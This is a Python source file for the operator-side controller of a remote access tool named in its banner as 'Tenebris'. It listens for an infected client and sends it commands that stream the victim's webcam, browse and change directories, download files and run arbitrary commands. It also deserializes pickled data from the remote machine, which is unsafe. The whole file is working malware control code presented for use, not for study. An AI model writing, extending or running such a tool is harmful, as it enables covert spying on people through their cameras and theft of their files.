import sys
import socket
import cv2
import pickle
import struct
import os
from tabulate import tabulate
from colorama import init, Fore, Style
import shutil

init()

program_name = """


    ███         ▄████████   ███▄▄▄▄       ▄████████   ▀█████████▄      ▄████████   ▄█      ▄████████ 
▀██████████▄    ███    ███   ███▀▀▀██▄    ███    ███     ███    ███    ███    ███  ███     ███    ███ 
   ▀▀███▀▀██    ███    █▀    ███   ███    ███    █▀      ███    ███    ███    ███  ███▌    ███    █▀  
     ███   ▀   ▄███▄▄▄       ███   ███   ▄███▄▄▄        ▄███▄▄▄██▀    ▄███▄▄▄▄██▀  ███▌    ███        
     ███      ▀▀███▀▀▀       ███   ███  ▀▀███▀▀▀       ▀▀███▀▀▀██▄   ▀▀███▀▀▀▀▀    ███▌  ▀███████████ 
     ███        ███    █▄    ███   ███    ███    █▄      ███    ██▄  ▀███████████  ███            ███ 
     ███        ███    ███   ███   ███    ███    ███     ███    ███    ███    ███  ███      ▄█    ███ 
    ▄████▀      ██████████    ▀█   █▀     ██████████   ▄█████████▀     ███    ███  █▀     ▄████████▀  
                   
                                                                   

"""

console_width, _ = shutil.get_terminal_size()

text_width = min(console_width, max(len(line) for line in program_name.split('\n')))

padding_width = (console_width - text_width) // 2
padded_program_name = '\n'.join(" " * padding_width + line[:text_width] for line in program_name.split('\n'))

print(Fore.MAGENTA + padded_program_name + Style.RESET_ALL)

HOST = 'localhost'
PORT = 5555

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))

s.listen(1)

def receive_data(client_socket):
    try:
        data = client_socket.recv(1024).decode(errors='ignore')
        return data
    except UnicodeDecodeError:
        print("Error: Failed to decode received data.")
        return ''

def send_data(client_socket, data):
    client_socket.send(data.encode())

def send_message(client_socket, message):
    send_data(client_socket, f'MSG: {message}')

def receive_result(client_socket):
    result_size_data = client_socket.recv(4)
    result_size = struct.unpack('!I', result_size_data)[0]
    result_data = b''
    while len(result_data) < result_size:
        result_data += client_socket.recv(result_size - len(result_data))
    result = pickle.loads(result_data)
    return result

def execute_command(client_socket, cmd):
    send_data(client_socket, cmd)
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        return False
    
    if cmd.lower() == 'camera':
        cv2.namedWindow('Received Video', cv2.WINDOW_NORMAL)
        while True:
            frame_size_data = b''
            while len(frame_size_data) < 4:
                frame_size_data += client_socket.recv(4 - len(frame_size_data))

            frame_size = struct.unpack('!I', frame_size_data)[0]
            frame_data = b''
            while len(frame_data) < frame_size:
                frame_data += client_socket.recv(frame_size - len(frame_data))

            frame = pickle.loads(frame_data)
            cv2.imshow('Received Video', frame)

            if cv2.waitKey(1) == ord('q'):
                break

        cv2.destroyAllWindows()

    if cmd.lower() == 'ls':
        result = receive_result(client_socket)
        table = []
        for file_path in result:
            file_name = os.path.basename(file_path)
            file_type = 'Folder' if os.path.isdir(file_path) else 'File'
            table.append([file_name, file_type])
        print(tabulate(table, headers=['Name', 'Type'], tablefmt='fancy_grid'))

    elif cmd.lower().startswith('cd '):
        foldername = cmd.split(' ', 1)[1]
        if not foldername:
            return True 

        if foldername == '..':
            print("Directory changed to parent folder")
            return True

        try:
            new_path_length_data = client_socket.recv(4)
            new_path_length = struct.unpack('!I', new_path_length_data)[0]
            new_path_data = b''
            while len(new_path_data) < new_path_length:
                new_path_data += client_socket.recv(new_path_length - len(new_path_data))
            new_path = new_path_data.decode('utf-8')
            print("Directory changed to:", new_path)
        except UnicodeDecodeError:
            pass
    
    elif cmd.lower().startswith('get '):
        filename = cmd.split(' ', 1)[1]
        send_data(client_socket, cmd)
        file_size_data = client_socket.recv(4)
        file_size = struct.unpack('!I', file_size_data)[0]
        file_data = b''
        while len(file_data) < file_size:
            file_data += client_socket.recv(file_size - len(file_data))
        with open(filename, 'wb') as file:
            file.write(file_data)
        print("File received and saved as:", filename)

    else:
        result = receive_data(client_socket)
        print(result)

    return True

while True:
    print(f'[*] listening as {HOST}:{PORT}')

    client = s.accept()
    print(f'[*] client connected {client[1]}')

    send_data(client[0], 'YOU LOGGED IN!')

    while True:
        cmd = input('>>> ')
        if cmd.lower() == 'clear':
            os.system('cls')
        if not execute_command(client[0], cmd):
            break

    client[0].close()

    cmd = input('Wait for a new client? (Y/n) ') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()
